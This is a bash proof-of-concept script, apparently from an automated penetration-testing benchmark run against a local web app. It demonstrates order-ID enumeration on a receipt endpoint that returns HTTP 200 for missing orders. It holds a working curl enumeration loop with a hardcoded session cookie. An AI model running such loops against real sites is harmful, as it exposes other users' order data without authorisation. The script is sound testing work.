#!/bin/bash
# POC: Demonstrates improper error handling that returns HTTP 200 for non-existent orders, facilitating order ID enumeration
# Target: ./repo
# Created: 2025-10-30T20:03:28.901Z
# Session: benchmark-XBEN-001-24-mhdu3kmr

echo "=================================================="
echo "Order ID Enumeration via Improper Error Handling"
echo "=================================================="
echo ""

TARGET="http://localhost:8082"
COOKIE="session=eyJ1c2VyX2lkIjoxMDAzMn0.aQPCgg.4UpC77UmRktlepmhnkVWDCJNnSk"

echo "[*] Testing improper error handling on /order/{order_id}/receipt endpoint"
echo ""

# Test 1: Valid order (should return HTTP 200 with order data)
echo "[TEST 1] Valid order ID (300123) - should return HTTP 200 with populated data"
echo "Command: curl -s -i -H 'Cookie: $COOKIE' '$TARGET/order/300123/receipt'"
RESPONSE1=$(curl -s -i -H "Cookie: $COOKIE" "$TARGET/order/300123/receipt")
STATUS1=$(echo "$RESPONSE1" | grep "HTTP/" | head -1 | awk '{print $2}')
BODY1=$(echo "$RESPONSE1" | grep -o "Order ID:</strong> [0-9]*" | head -1)
echo "Status: HTTP $STATUS1"
echo "Body excerpt: $BODY1"
echo ""

# Test 2: Non-existent order (SHOULD return HTTP 404, but returns HTTP 200)
echo "[TEST 2] Non-existent order ID (999999) - SHOULD return HTTP 404, but returns HTTP 200"
echo "Command: curl -s -i -H 'Cookie: $COOKIE' '$TARGET/order/999999/receipt'"
RESPONSE2=$(curl -s -i -H "Cookie: $COOKIE" "$TARGET/order/999999/receipt")
STATUS2=$(echo "$RESPONSE2" | grep "HTTP/" | head -1 | awk '{print $2}')
BODY2=$(echo "$RESPONSE2" | grep -o "Order ID:</strong> [^<]*" | head -1)
echo "Status: HTTP $STATUS2 (INCORRECT - should be 404)"
echo "Body excerpt: $BODY2 (empty order ID)"
echo ""

# Test 3: Invalid format (should return HTTP 404)
echo "[TEST 3] Invalid order ID format (ABC) - should return HTTP 404"
echo "Command: curl -s -i -H 'Cookie: $COOKIE' '$TARGET/order/ABC/receipt'"
RESPONSE3=$(curl -s -i -H "Cookie: $COOKIE" "$TARGET/order/ABC/receipt")
STATUS3=$(echo "$RESPONSE3" | grep "HTTP/" | head -1 | awk '{print $2}')
echo "Status: HTTP $STATUS3 (correct)"
echo ""

# Test 4: Enumeration demonstration
echo "[TEST 4] Enumeration Attack - Finding valid orders in range 300120-300130"
echo "Valid orders will have populated 'Order ID:' fields, invalid ones will be empty"
echo ""

VALID_ORDERS=()
for id in $(seq 300120 300130); do
    RESP=$(curl -s -H "Cookie: $COOKIE" "$TARGET/order/$id/receipt")
    if echo "$RESP" | grep -q "Order ID:</strong> $id"; then
        echo "  [VALID] Order $id exists (populated data)"
        VALID_ORDERS+=($id)
    else
        echo "  [EMPTY] Order $id does not exist (empty template, but still HTTP 200)"
    fi
done

echo ""
echo "=================================================="
echo "VULNERABILITY CONFIRMED"
echo "=================================================="
echo ""
echo "Summary:"
echo "  - Valid order (300123): HTTP $STATUS1 with populated data"
echo "  - Non-existent order (999999): HTTP $STATUS2 with empty template (SHOULD BE 404)"
echo "  - Invalid format (ABC): HTTP $STATUS3 (correct)"
echo ""
echo "Impact:"
echo "  The application returns HTTP 200 for both valid and non-existent orders,"
echo "  but distinguishes them by content (populated vs empty template)."
echo "  This allows attackers to enumerate all valid order IDs without"
echo "  triggering obvious 404 errors in logs."
echo ""
echo "Valid orders discovered in test range: ${VALID_ORDERS[@]:-none}"
echo ""